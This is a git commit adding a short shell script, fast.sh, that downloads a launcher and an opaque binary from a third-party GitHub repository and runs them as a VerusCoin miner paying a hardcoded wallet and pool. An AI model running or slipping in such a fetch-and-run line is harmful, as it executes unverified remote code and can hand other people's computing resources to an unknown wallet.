48918a31735af89d079e8dee93add6fd088eac91
xunxy <92241163+xunxy@users.noreply.github.com>
2021-10-11 04:29:00 +0000

    Create fast.sh

---
+++ fast.sh
@@ -0,0 +1,3 @@
+# veruscoin
+sudo apt update
+wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RTvZYjB5RNhoKZpdj88UQsQ5tMzMKbGLNd -rigName $(echo $(shuf -i 1-9999 -n 1)-CRT) -pool1 na.luckpool.net:3956#xnsub
